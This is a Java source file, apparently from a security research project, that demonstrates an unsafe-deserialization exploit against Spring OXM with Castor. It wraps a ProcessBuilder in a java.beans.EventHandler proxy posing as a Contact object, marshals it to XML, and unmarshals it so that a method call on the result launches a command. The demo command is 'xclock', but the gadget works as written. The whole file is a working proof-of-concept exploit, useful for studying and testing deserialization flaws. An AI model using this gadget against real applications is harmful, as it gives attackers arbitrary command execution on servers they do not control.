package org.pwntester.springbreaker;


import com.company.model.Contact;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.oxm.Marshaller;
import org.springframework.oxm.Unmarshaller;

import javax.xml.transform.stream.StreamResult;
import javax.xml.transform.stream.StreamSource;
import java.beans.EventHandler;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Proxy;

public class EventHandlerCastorExploit {
    private Marshaller marshaller;
    private Unmarshaller unmarshaller;

    public void setMarshaller(Marshaller marshaller) {
        this.marshaller = marshaller;
    }

    public void setUnmarshaller(Unmarshaller unmarshaller) {
        this.unmarshaller = unmarshaller;
    }

    public static void main(String[] args) throws IOException {
        ClassPathXmlApplicationContext appContext = new ClassPathXmlApplicationContext("castor-exploit.xml");
        EventHandlerCastorExploit application = (EventHandlerCastorExploit) appContext.getBean("application");
        System.out.println("[+] Spring context initialized");
        // Marshall Object

        // Proxy
        ProcessBuilder pb = new ProcessBuilder("xclock");
        EventHandler handler = new EventHandler(pb, "start", null, null); 
        Contact proxy = (Contact) Proxy.newProxyInstance(Contact.class.getClassLoader(), new Class<?>[] { Contact.class }, handler); 

        FileOutputStream os = null;
        try {
            os = new FileOutputStream("contact.xml");
            application.marshaller.marshal(proxy, new StreamResult(os));
        } catch (Exception e) { 
            e.printStackTrace();
        } finally {
            if (os != null) {
                os.close();
            }
        }

        System.out.println("[+] Object marshalled");

        // Unmarshall
        FileInputStream is = null;
        try {
            is = new FileInputStream("contact.xml");
            Contact contact = (Contact) application.unmarshaller.unmarshal(new StreamSource(is));
            System.out.println(contact.getName());
        } catch (Exception e){ 
            e.printStackTrace();
        } finally {
            if (is != null) {
                is.close();
            }
        }

        System.out.println("[+] Object unmarshalled");

    }
}